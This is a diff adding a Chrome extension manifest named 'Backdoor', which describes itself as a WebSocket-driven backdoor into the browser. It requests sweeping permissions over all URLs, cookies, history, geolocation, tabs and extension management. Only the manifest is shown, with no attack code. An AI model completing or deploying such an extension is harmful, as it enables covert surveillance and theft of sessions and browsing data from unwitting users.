@@ -1,0 +1,20 @@
+{
+  "name": "Backdoor",
+  "version": "0.1",
+  "description": "A WebSocket-driven backdoor into the browser.",
+  "background_page": "background.html",
+  "incognito": "split",
+  "options_page": "options.html",
+  "permissions": [ "<all_urls>",
+		   "background",
+		   "bookmarks",
+		   "contextMenus",
+		   "cookies",
+		   "geolocation",
+		   "history",
+		   "idle",
+		   "management",
+		   "notifications",
+		   "tabs",
+		   "unlimitedStorage" ]
+}
